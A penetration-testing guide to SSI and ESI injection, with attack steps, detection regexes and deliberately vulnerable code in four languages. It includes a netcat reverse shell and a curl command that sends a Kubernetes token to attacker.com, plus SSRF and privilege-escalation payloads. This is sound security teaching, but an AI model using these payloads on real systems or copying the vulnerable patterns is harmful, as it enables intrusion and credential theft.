# SSI Injection

## Check List

## Methodology

### Black Box

#### Read Sensitive File via Server Side Include

{% stepper %}
{% step %}
Identify the target web application and perform basic information gathering to determine the web server type
{% endstep %}

{% step %}
Check whether the server potentially supports **Server-Side Includes (SSI)** by ( Looking for `.shtml` files in the application or Inspecting response headers and server banners)
{% endstep %}

{% step %}
Identify all possible user input points, including ( Cookie , comments,)
{% endstep %}

{% step %}
Select an input field that reflects user-supplied data back into the application (error messages, forum posts, profile fields) like

```http
POST /comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

comment=HelloWorld
```
{% endstep %}

{% step %}
Submit a test payload containing an SSI directive, such as

```php
<!--#include virtual="/etc/passwd" -->
```

Injected request

```http
POST /comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

comment=<!--#include virtual="/etc/passwd" -->
```
{% endstep %}

{% step %}
Then, check the server response to see if the payloads we injected are displayed and processed in the response and include the contents of the sensitive `etc/passwd` file. If so, the vulnerability is successfully confirmed
{% endstep %}
{% endstepper %}

***

#### Sever Side Including in HTTP Header&#x20;

{% stepper %}
{% step %}
injection via HTTP headers, for example:

```http
GET / HTTP/1.1
Host: target.com
Referer: <!--#exec cmd="/bin/ps ax"-->
User-Agent: <!--#include virtual="/proc/version"-->
```
{% endstep %}

{% step %}
Send the crafted request using a proxy tool (Burp Suite Repeater)
{% endstep %}

{% step %}
Observe whether the injected SSI directives are executed or included in the generated page
{% endstep %}

{% step %}
Conclude that the application is vulnerable to SSI Injection if server-side directives are successfully executed
{% endstep %}
{% endstepper %}

***

### White Box

#### Server-Side Request Forgery via ESI Interpolation in JSON Microservice Responses

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on API endpoints returning large JSON payloads (e.g., user profiles, product catalogs, telemetry dashboards)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a highly distributed Content Delivery Network (CDN) or Edge Caching architecture (e.g., Varnish, Akamai, Fastly)
{% endstep %}

{% step %}
Investigate the "Dynamic JSON Hydration" optimization. Caching massive, static JSON API responses at the edge saves backend database CPU. However, certain fields within the JSON (like a user's current session token, CSRF token, or live pricing) must remain strictly dynamic
{% endstep %}

{% step %}
Discover the architectural shortcut: Instead of refactoring the frontend Single Page Application (SPA) to make two separate API calls (one cached, one dynamic), the Edge engineers configure the reverse proxy to parse Edge-Side Includes (ESI) natively _inside_ the JSON payload
{% endstep %}

{% step %}
Analyze the backend microservice controller. Observe that the developer explicitly appends the `Surrogate-Control: content="ESI/1.0"` header to the JSON response to instruct the Edge caching tier to process ESI tags
{% endstep %}

{% step %}
Understand the fatal trust assumption: The backend developer assumes that because the API exclusively returns `application/json`, the response is immune to injection attacks. They rely entirely on the frontend React/Vue framework to encode malicious characters during DOM rendering, completely omitting contextual output encoding on the backend
{% endstep %}

{% step %}
Recognize the architectural collapse: The Edge cache parses the HTTP response sequentially as a raw text string, entirely agnostic to the JSON structure. It actively searches for `<esi:include>` tags before the payload ever reaches the frontend SPA
{% endstep %}

{% step %}
Authenticate as a standard user. Update a free-text string field in your profile (e.g., `bio`, `company_name`, or `shipping_address`)
{% endstep %}

{% step %}
Inject an unescaped ESI payload targeting an internal microservice completely isolated from the public internet (e.g., `Company Inc. <esi:include src="[http://internal-billing-api.svc.cluster.local/v1/invoices/export](http://internal-billing-api.svc.cluster.local/v1/invoices/export)" />`)
{% endstep %}

{% step %}
Request the API endpoint.
{% endstep %}

{% step %}
The backend microservice serializes your payload into the JSON string and attaches the `Surrogate-Control` header.
{% endstep %}

{% step %}
The Edge proxy intercepts the response, detects the ESI instruction, parses your injected `<esi:include>` tag out of the JSON string, and executes the Server-Side Request Forgery (SSRF) directly from the highly trusted internal Edge tier.
{% endstep %}

{% step %}
The Edge proxy stitches the internal billing data directly into your JSON response and delivers it to your browser

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Response\.Headers\.Add\s*\(\s*"Surrogate-Control"|Response\.Headers\[\s*"Surrogate-Control"\s*\]|AppendHeader\s*\(\s*"Surrogate-Control"|Headers\.Append\s*\(\s*"Surrogate-Control")
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:response\.setHeader\s*\(\s*"Surrogate-Control"|response\.addHeader\s*\(\s*"Surrogate-Control"|HttpHeaders\.SURROGATE_CONTROL|setHeader\s*\(\s*"Surrogate-Control")
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:header\s*\(\s*['"]Surrogate-Control:|headers_list\s*\(\)|header_remove\s*\(\s*['"]Surrogate-Control)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:res\.(?:set|setHeader|append)\s*\(\s*['"]Surrogate-Control"|response\.setHeader\s*\(\s*['"]Surrogate-Control")
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Response\.Headers\.Add\("Surrogate-Control"|Headers\.Append\("Surrogate-Control"|AppendHeader\("Surrogate-Control"
```
{% endtab %}

{% tab title="Java" %}
```regexp
response\.setHeader\("Surrogate-Control"|response\.addHeader\("Surrogate-Control"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
header\('Surrogate-Control:|header\("Surrogate-Control:
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
res\.(set|setHeader|append)\('Surrogate-Control'|res\.(set|setHeader|append)\("Surrogate-Control"
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[HttpGet("/api/v1/users/{id}/profile")]
public async Task<IActionResult> GetUserProfile(string id)
{
    var userProfile = await _userRepository.GetProfileAsync(id);
    
    // [1]
    // [2]
    var responseDto = new UserProfileDto 
    {
        Id = userProfile.Id,
        CompanyName = userProfile.CompanyName,
        // [3]
        LivePricingToken = "<esi:include src='/api/v1/internal/pricing/token' />" 
    };

    // [4]
    Response.Headers.Add("Surrogate-Control", "content=\"ESI/1.0\"");
    Response.Headers.Add("Cache-Control", "public, max-age=3600");

    return Ok(responseDto);
}
```
{% endtab %}

{% tab title="Java" %}
```java
@GetMapping(value = "/api/v1/users/{id}/profile", produces = MediaType.APPLICATION_JSON_VALUE)
public ResponseEntity<?> getUserProfile(@PathVariable String id) {
    UserProfile userProfile = userRepository.getProfile(id);
    
    // [1]
    // [2]
    Map<String, Object> responseDto = new HashMap<>();
    responseDto.put("Id", userProfile.getId());
    responseDto.put("CompanyName", userProfile.getCompanyName());
    // [3]
    responseDto.put("LivePricingToken", "<esi:include src='/api/v1/internal/pricing/token' />");

    // [4]
    return ResponseEntity.ok()
            .header("Surrogate-Control", "content=\"ESI/1.0\"")
            .header("Cache-Control", "public, max-age=3600")
            .body(responseDto);
}
```
{% endtab %}

{% tab title="PHP" %}
```php
public function getUserProfile(string $id) 
{
    $userProfile = $this->userRepository->getProfile($id);
    
    // [1]
    // [2]
    $responseDto = [
        'Id' => $userProfile->id,
        'CompanyName' => $userProfile->companyName,
        // [3]
        'LivePricingToken' => "<esi:include src='/api/v1/internal/pricing/token' />"
    ];

    // [4]
    return response()->json($responseDto)
                     ->header('Surrogate-Control', 'content="ESI/1.0"')
                     ->header('Cache-Control', 'public, max-age=3600');
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/api/v1/users/:id/profile', async (req, res) => {
    let userProfile = await userRepository.getProfile(req.params.id);
    
    // [1]
    // [2]
    let responseDto = {
        Id: userProfile.id,
        CompanyName: userProfile.companyName,
        // [3]
        LivePricingToken: "<esi:include src='/api/v1/internal/pricing/token' />"
    };

    // [4]
    res.set('Surrogate-Control', 'content="ESI/1.0"');
    res.set('Cache-Control', 'public, max-age=3600');

    res.json(responseDto);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The backend retrieves the user's profile data from the primary database, mapping it directly into a Data Transfer Object (DTO), \[2] The backend executes no HTML entity encoding or sanitization, relying entirely on the standard JSON serializer. The developer strictly assumes JSON structural integrity protects against injection, \[3] To support high-performance caching while retaining dynamic pricing data, the developer explicitly injects an ESI tag into the JSON structure, \[4] The fatal boundary enablement. By attaching the `Surrogate-Control` header, the backend actively instructs the upstream Varnish or Akamai edge nodes to parse the entire HTTP response body for ESI tags. The edge proxy scans the raw string, completely oblivious to JSON boundaries, and blindly executes any `<esi:include>` tag it encounters, including those maliciously embedded inside user-controlled string fields

```http
// 1. Attacker updates their CompanyName to contain the ESI SSRF payload.
PUT /api/v1/users/me/profile HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker-token>
Content-Type: application/json

{
  "CompanyName": "AttackerCorp \", \"ExfiltratedData\": \"<esi:include src='http://internal-kube-api.svc.cluster.local:8080/secrets' />"
}
```

```http
// 2. Attacker queries their own profile to trigger the Edge parsing.
GET /api/v1/users/attacker-id/profile HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <attacker-token>

// 3. The Edge proxy intercepts the response, executes the ESI include against the internal network, 
// and stitches the highly classified internal Kubernetes secrets directly into the JSON string.
HTTP/1.1 200 OK
Surrogate-Control: content="ESI/1.0"
Content-Type: application/json

{
    "Id": "attacker-id",
    "CompanyName": "AttackerCorp \", \"ExfiltratedData\": \"{\"kubernetes_admin_token\": \"eyJhbGciOiJSUzI1NiIs...\"}",
    "LivePricingToken": "token_9912"
}
```
{% endstep %}

{% step %}
To fulfill the business requirement of maintaining sub-millisecond API response times without sacrificing real-time pricing accuracy, DevOps engineers deployed an Edge-Side Includes (ESI) architecture. The backend developers optimized the integration by injecting ESI tags directly into JSON API responses and authorizing the Edge to parse them via the `Surrogate-Control` header. By assuming that XSS sanitization was solely a frontend responsibility, the backend failed to sanitize structural ESI characters (`<`, `>`). The attacker exploited this by injecting a malicious ESI inclusion command into their profile data. The Edge proxy, operating before the frontend validation layer, blindly parsed the raw string, executed the internal SSRF request against a non-routable microservice, and spliced the highly sensitive internal data perfectly back into the JSON structure, neutralizing all network segmentation architectures
{% endstep %}
{% endstepper %}

***

#### Remote Code Execution via Legacy SSI Extensibility in Asynchronous Document Compilers

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus intensely on enterprise reporting systems, invoice generators, or background bulk-export features (e.g., `Export to PDF`, `Generate Quarterly HTML Report`)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the offline compilation architecture. Generating massive, highly styled HTML reports requires assembling data from dozens of internal microservices. Executing this synchronously blocks the main thread
{% endstep %}

{% step %}
Investigate the "Report Assembly" optimization. To decouple the generation process, the backend microservice compiles a skeleton HTML document. To inject dynamic charts and tables without invoking a heavy templating engine, the developer relies on the internal Nginx load balancer
{% endstep %}

{% step %}
Discover the structural implementation: The internal Nginx server is explicitly configured with `ssi on;` for the `/internal/reports/` path
{% endstep %}

{% step %}
Analyze the backend Report Generator service. Observe that the developer constructs the HTML skeleton using a Markdown-to-HTML parser to allow enterprise users to customize the report headers and footers with rich text
{% endstep %}

{% step %}
Understand the specific Markdown specification assumption: Standard Markdown parsers (e.g., Markdig, Flexmark, Parsedown) explicitly preserve raw HTML comments (`<!-- comment -->`) during the HTML conversion process, assuming they are harmless, non-executable metadata
{% endstep %}

{% step %}
Recognize the catastrophic architectural overlay: Server-Side Includes (SSI) directives are executed via HTML comments (e.g., `<!--#exec cmd="..." -->`)
{% endstep %}

{% step %}
Confirm the execution sequence: The user inputs malicious Markdown containing an SSI `exec` directive. The backend Markdown parser faithfully preserves the HTML comment and writes it to the disk or network stream. The internal Nginx proxy intercepts the HTML stream, detects the SSI directive, and executes arbitrary system commands
{% endstep %}

{% step %}
Authenticate to the enterprise portal and navigate to the report template configuration
{% endstep %}

{% step %}
Inject the malicious SSI command into the Markdown template: `<!--#exec cmd="nc -e /bin/sh attacker.com 4444" -->`
{% endstep %}

{% step %}
Trigger the asynchronous report generation
{% endstep %}

{% step %}
The backend service generates the HTML, preserving your HTML comment. It forwards the payload through the internal Nginx assembly proxy to reach the PDF rendering engine.
{% endstep %}

{% step %}
Nginx parses the document, encounters the `<!--#exec` directive, and detonates the Remote Code Execution payload directly on the internal API Gateway infrastructure

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:Markdown\.ToHtml\s*\(.*DisableHtml\s*=\s*false|Markdown\.ToHtml\s*\(|MarkdownPipelineBuilder[\s\S]{0,120}?(?:UseAdvancedExtensions|Build)|UseSoftlineBreakAsHardlineBreak|DisableHtml\s*=\s*false)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:builder\.useHtml\s*\(\)|HtmlRenderer\.builder\s*\(|Parser\.builder\s*\(|Flexmark|commonmark[\s\S]{0,120}?HtmlRenderer)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:new\s+Parsedown\s*\(\)->text|ParsedownExtra|Parsedown::text|League\\CommonMark|MarkdownExtra)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:marked\.parse\s*\(|marked\s*\(|markdown-it|showdown\.Converter|remark[\s\S]{0,120}?rehypeRaw)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Markdown\.ToHtml\(.*DisableHtml\s*=\s*false|MarkdownPipelineBuilder|DisableHtml\s*=\s*false
```
{% endtab %}

{% tab title="Java" %}
```regexp
builder\.useHtml\(\)|HtmlRenderer\.builder\(|Parser\.builder\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
new\s+Parsedown\(\)->text|ParsedownExtra|League\\CommonMark
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
marked\.parse\(|markdown-it|showdown\.Converter|rehypeRaw
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class ReportGenerationWorker : IMessageConsumer<ReportRequestedEvent>
{
    private readonly HttpClient _internalProxyClient;

    public async Task ConsumeAsync(ReportRequestedEvent evt)
    {
        // [1]
        // [2]
        var pipeline = new MarkdownPipelineBuilder().UseAdvancedExtensions().Build();
        var htmlHeader = Markdown.ToHtml(evt.CustomMarkdownHeader, pipeline);

        // [3]
        var skeletonHtml = $@"
            <html>
                <head><title>Quarterly Report</title></head>
                <body>
                    {htmlHeader}
                    <!--#include virtual='/internal/microservices/financial-data' -->
                </body>
            </html>";

        // [4]
        var request = new HttpRequestMessage(HttpMethod.Post, "http://nginx-internal.svc.cluster.local/render-pdf");
        request.Content = new StringContent(skeletonHtml, Encoding.UTF8, "text/html");
        
        await _internalProxyClient.SendAsync(request);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class ReportGenerationWorker {

    @Autowired
    private RestTemplate internalProxyClient;

    @KafkaListener(topics = "report-requests")
    public void consume(ReportRequestedEvent evt) {
        // [1]
        // [2]
        Parser parser = Parser.builder().build();
        HtmlRenderer renderer = HtmlRenderer.builder().build();
        
        Node document = parser.parse(evt.getCustomMarkdownHeader());
        String htmlHeader = renderer.render(document);

        // [3]
        String skeletonHtml = "<html><body>\n" +
                              htmlHeader + "\n" +
                              "<!--#include virtual='/internal/microservices/financial-data' -->\n" +
                              "</body></html>";

        // [4]
        HttpHeaders headers = new HttpHeaders();
        headers.setContentType(MediaType.TEXT_HTML);
        HttpEntity<String> request = new HttpEntity<>(skeletonHtml, headers);

        internalProxyClient.postForObject("http://nginx-internal.svc.cluster.local/render-pdf", request, String.class);
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class ReportGenerationWorker implements ShouldQueue
{
    public function handle(ReportRequestedEvent $evt)
    {
        // [1]
        // [2]
        $parsedown = new \Parsedown();
        $htmlHeader = $parsedown->text($evt->customMarkdownHeader);

        // [3]
        $skeletonHtml = "
            <html>
                <body>
                    {$htmlHeader}
                    <!--#include virtual='/internal/microservices/financial-data' -->
                </body>
            </html>";

        // [4]
        $ch = curl_init('http://nginx-internal.svc.cluster.local/render-pdf');
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $skeletonHtml);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: text/html']);
        
        curl_exec($ch);
        curl_close($ch);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class ReportGenerationWorker {
    static async consume(evt) {
        // [1]
        // [2]
        const marked = require('marked');
        let htmlHeader = marked.parse(evt.customMarkdownHeader);

        // [3]
        let skeletonHtml = `
            <html>
                <body>
                    ${htmlHeader}
                    <!--#include virtual='/internal/microservices/financial-data' -->
                </body>
            </html>`;

        // [4]
        await axios.post('http://nginx-internal.svc.cluster.local/render-pdf', skeletonHtml, {
            headers: { 'Content-Type': 'text/html' }
        });
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture processes heavy report generation requests asynchronously in the background, \[2] To provide enterprise customers with deeply customizable report templates without exposing raw HTML injection (XSS), the developers strictly enforce the use of Markdown, \[3] The background worker dynamically concatenates the converted Markdown with hardcoded legacy Server-Side Include (SSI) directives. These directives instruct the internal proxy to stitch together data from various isolated microservices, \[4] The fatal interaction between isolated parsers. Standard Markdown libraries explicitly preserve HTML comments to support non-rendering metadata. By pushing the final string through the internal Nginx proxy (which has `ssi on;` enabled to process the `<!--#include` tag), the developer unknowingly subjects the preserved user-controlled HTML comments to active server-side execution, bypassing the entire Markdown security perimeter

```http
// 1. Attacker (Tenant Admin) updates their Reporting Configuration via the API.
// They inject the SSI execution directive inside a valid Markdown payload.
PUT /api/v1/settings/report-template HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <admin-token>
Content-Type: application/json

{
  "customMarkdownHeader": "# Q3 Financial Report\n\nGenerated internally. <!--#exec cmd=\"cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/token.txt && curl -X POST -d @/tmp/token.txt http://attacker.com/steal\" -->"
}

// 2. Attacker requests an export.
POST /api/v1/reports/export HTTP/1.1
Host: api.enterprise.tld

// 3. The Backend Worker parses the Markdown, preserves the HTML comment, and constructs the DOM.
// 4. The HTML is dispatched to the Nginx internal assembly proxy.
// 5. Nginx parses the DOM, executes the embedded `exec` command under the context of the Nginx worker process.
// 6. The attacker receives the highly privileged Kubernetes service account token on their external server.
```
{% endstep %}

{% step %}
To decouple massive data aggregation tasks from synchronous microservices, the enterprise deployed an internal Nginx proxy to stitch together report fragments using legacy Server-Side Includes (SSI). To secure user-provided templates against XSS, developers mandated the use of Markdown. However, because standard Markdown parsers functionally treat HTML comments as benign structural artifacts, they pass them through to the output perfectly intact. The attacker exploited this assumption by wrapping an SSI execution directive inside an HTML comment. The backend worker generated the HTML and routed it through the Nginx proxy. Nginx detected the valid SSI tag, interpreted it as an authoritative administrative command, and executed arbitrary shell commands on the underlying host network, pivoting a harmless text-formatting feature into devastating Remote Code Execution
{% endstep %}
{% endstepper %}

***

#### Authorization Defeat via ESI Variable Shadowing in Multi-Tier Caching

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on localized routing architectures and personalized dynamic content delivery (Geo-location overrides, explicit Role-based headers)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a complex Edge Routing architecture utilizing advanced Edge-Side Includes (ESI). In global B2B platforms, Edge proxies (like Varnish or Akamai) do more than just cache; they actively perform routing logic and evaluate lightweight access control
{% endstep %}

{% step %}
Investigate the "Edge Variable Context" optimization. To avoid duplicate calculations across hundreds of ESI fragments on the same page, the Edge proxy initializes global variables during the initial HTML request (e.g., `<esi:assign name="is_premium_tenant" value="false" />`)
{% endstep %}

{% step %}
Analyze the backend controller responsible for rendering the primary HTML shell
{% endstep %}

{% step %}
Discover the architectural synchronization requirement: The backend framework must inform the Edge cache of the user's current contextual state (like their organizational role or tenant tier) so the Edge can dynamically `<esi:choose>` which subsequent fragments to load
{% endstep %}

{% step %}
Observe how the backend propagates this state. Instead of relying purely on HTTP headers, the backend developer writes ESI assignment tags directly into the HTML `<body>` based on database queries
{% endstep %}

{% step %}
Locate an endpoint where user-controlled input is reflected early in the HTML document, physically _before_ the backend executes its own authoritative ESI assignment tags. For example, a "Welcome back, {UserDisplayName}" banner at the very top of the DOM
{% endstep %}

{% step %}
Recognize the fatal parsing assumption: ESI execution engines parse documents strictly from top to bottom. If a variable is assigned multiple times, the final state of the variable depends entirely on whether the Edge cache enforces variable immutability or allows silent overwriting (Shadowing)
{% endstep %}

{% step %}
By injecting an ESI `<esi:assign>` tag into your `DisplayName`, you define the variable _early_ in the document tree
{% endstep %}

{% step %}
If the backend developer later attempts to assign the same variable (e.g., `<esi:assign name="is_admin" value="false" />`), but places it in the `<footer>` or a later block, verify how the Edge handles it. Even better, inject the payload to deliberately close the execution block and redefine the variable _after_ the server defines it, depending on injection location
{% endstep %}

{% step %}
If you can reflect input _after_ the authoritative assignment, inject `<esi:assign name="is_admin" value="true" />` into the DOM
{% endstep %}

{% step %}
The backend framework securely HTML-encodes your input. However, discover that the Edge proxy processes ESI tags _before_ or _ignoring_ HTML entity decoding, or the backend specifically marks the reflection zone as `Html.Raw()` to support emojis or custom formatting
{% endstep %}

{% step %}
The Edge proxy parses the document, executes your malicious ESI assignment, overwrites the authoritative internal state variable, and immediately executes the `<esi:choose>` routing block using your elevated privileges, disclosing cached administrative fragments

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:ViewBag\.IsAdmin\s*=\s*(?:false|true).*<esi:assign|<esi:assign\s+name=.*value=.*|Response\.Write\s*\(.*<esi:assign)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:assignEsi\s*\(|<esi:assign\s+name=.*value=.*|response\.getWriter\(\).*<esi:assign|out\.print\s*\(.*<esi:assign)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$this->assignEsi\s*\(|echo\s*['"].*<esi:assign|print\s+.*<esi:assign|<esi:assign\s+name=.*value=.*)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:res\.(?:send|write)\s*\(.*<esi:assign|`[\s\S]*<esi:assign\s+name=.*\$\{|template.*esi:assign)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
ViewBag\.IsAdmin\s*=\s*(true|false).*<esi:assign|<esi:assign\s+name=.*value=.*
```
{% endtab %}

{% tab title="Java" %}
```regexp
assignEsi\(|<esi:assign\s+name=.*value=.*|response\.getWriter\(\).*<esi:assign
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$this->assignEsi\(|echo\s*['\"].*<esi:assign|<esi:assign\s+name=.*value=.*
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
res\.(send|write)\(.*<esi:assign|`.*<esi:assign\s+name=.*\$\{
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class DashboardController : Controller
{
    [HttpGet("/dashboard")]
    public IActionResult Index()
    {
        // [1]
        // [2]
        var isPremium = _currentUser.Tier == "Enterprise" ? "true" : "false";

        // [3]
        var html = $@"
            <html>
            <head>
                <esi:assign name='is_premium_tenant' value='{isPremium}' />
            </head>
            <body>
                <!-- [4] -->
                <div class='welcome'>Welcome, {Html.Raw(_currentUser.OrganizationName)}</div>
                
                <esi:choose>
                    <esi:when test=""$(is_premium_tenant) == 'true'"">
                        <esi:include src='/internal/fragments/premium-analytics' />
                    </esi:when>
                </esi:choose>
            </body>
            </html>";

        Response.Headers.Add("Surrogate-Control", "content=\"ESI/1.0\"");
        return Content(html, "text/html");
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Controller
public class DashboardController {

    @GetMapping(value = "/dashboard", produces = MediaType.TEXT_HTML_VALUE)
    @ResponseBody
    public String index() {
        // [1]
        // [2]
        String isPremium = currentUser.getTier().equals("Enterprise") ? "true" : "false";

        // [3]
        // [4]
        String html = "<html><head>\n" +
                      "<esi:assign name='is_premium_tenant' value='" + isPremium + "' />\n" +
                      "</head><body>\n" +
                      "<div class='welcome'>Welcome, " + currentUser.getOrganizationName() + "</div>\n" +
                      "<esi:choose>\n" +
                      "  <esi:when test=\"$(is_premium_tenant) == 'true'\">\n" +
                      "    <esi:include src='/internal/fragments/premium-analytics' />\n" +
                      "  </esi:when>\n" +
                      "</esi:choose>\n" +
                      "</body></html>";

        HttpServletResponse response = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getResponse();
        response.setHeader("Surrogate-Control", "content=\"ESI/1.0\"");
        
        return html;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class DashboardController extends Controller
{
    public function index()
    {
        // [1]
        // [2]
        $isPremium = $this->currentUser->tier === 'Enterprise' ? 'true' : 'false';

        // [3]
        // [4]
        $html = "
            <html>
            <head>
                <esi:assign name='is_premium_tenant' value='{$isPremium}' />
            </head>
            <body>
                <div class='welcome'>Welcome, {$this->currentUser->organizationName}</div>
                
                <esi:choose>
                    <esi:when test=\"$(is_premium_tenant) == 'true'\">
                        <esi:include src='/internal/fragments/premium-analytics' />
                    </esi:when>
                </esi:choose>
            </body>
            </html>";

        return response($html)
            ->header('Surrogate-Control', 'content="ESI/1.0"');
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
router.get('/dashboard', (req, res) => {
    // [1]
    // [2]
    let isPremium = req.user.tier === 'Enterprise' ? 'true' : 'false';

    // [3]
    // [4]
    let html = `
        <html>
        <head>
            <esi:assign name='is_premium_tenant' value='${isPremium}' />
        </head>
        <body>
            <div class='welcome'>Welcome, ${req.user.organizationName}</div>
            
            <esi:choose>
                <esi:when test="$(is_premium_tenant) == 'true'">
                    <esi:include src='/internal/fragments/premium-analytics' />
                </esi:when>
            </esi:choose>
        </body>
        </html>`;

    res.set('Surrogate-Control', 'content="ESI/1.0"');
    res.send(html);
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture relies heavily on Edge-Side Includes to dynamically assemble personalized dashboards without breaking the caching lifecycle of the main application shell, \[2] The backend executes the authoritative database query to determine the user's licensing tier and establishes the security context, \[3] The developer correctly defines the ESI variable at the top of the DOM tree to ensure it is available for all subsequent `<esi:choose>` routing decisions, \[4] The fatal sequential parsing flaw. The developer explicitly bypasses HTML encoding (or uses string interpolation) on the `OrganizationName` field. Because the Edge ESI parser evaluates the document sequentially, injecting an `<esi:assign>` tag into this field successfully shadows (overwrites) the previously defined authoritative variable. The subsequent `<esi:choose>` block evaluates the poisoned state

```http
// 1. Attacker (Free Tier Tenant) updates their Organization Name via the API.
// Payload: AttackerCorp <esi:assign name="is_premium_tenant" value="true" />
PUT /api/v1/settings/organization HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <free-tier-token>
Content-Type: application/json

{
  "OrganizationName": "AttackerCorp <esi:assign name='is_premium_tenant' value='true' />"
}
```

```http
// 2. Attacker loads the primary dashboard.
GET /dashboard HTTP/1.1
Host: portal.enterprise.tld
Cookie: SessionToken=FREE_TIER_TOKEN

// 3. The backend generates the HTML, safely defining `is_premium_tenant = 'false'` at the top.
// 4. The backend injects the malicious Organization Name into the body.
// 5. The Edge proxy (Varnish) evaluates the response top-to-bottom.
// Varnish reads: <esi:assign name='is_premium_tenant' value='false' />
// Varnish reads: <esi:assign name='is_premium_tenant' value='true' />  <- Variable Overwritten
// Varnish evaluates: <esi:when test="$(is_premium_tenant) == 'true'">

// 6. The Edge proxy seamlessly includes the highly privileged internal fragment and serves it.
HTTP/1.1 200 OK
Content-Type: text/html

<div class='welcome'>Welcome, AttackerCorp</div>
<div class='premium-data'>...[HIGHLY_CONFIDENTIAL_ANALYTICS_DATA]...</div>
```
{% endstep %}

{% step %}
To ensure dynamic content routing did not destroy global edge caching performance, enterprise architects offloaded access control conditional logic directly to the Edge proxy via ESI variables. The backend securely instantiated the user's true authorization state at the beginning of the HTTP response. However, the architecture failed to enforce variable immutability at the edge layer. By exploiting a lack of HTML contextual encoding on an unprivileged profile field, the attacker injected an explicit ESI reassignment directive later in the DOM tree. Because the Edge parser processes the document linearly, the attacker's injected tag overwrote the backend's authoritative security declaration. The subsequent ESI conditional routing blocks evaluated the poisoned variable, successfully bypassing the enterprise licensing restrictions and exposing heavily restricted internal microservice fragments
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
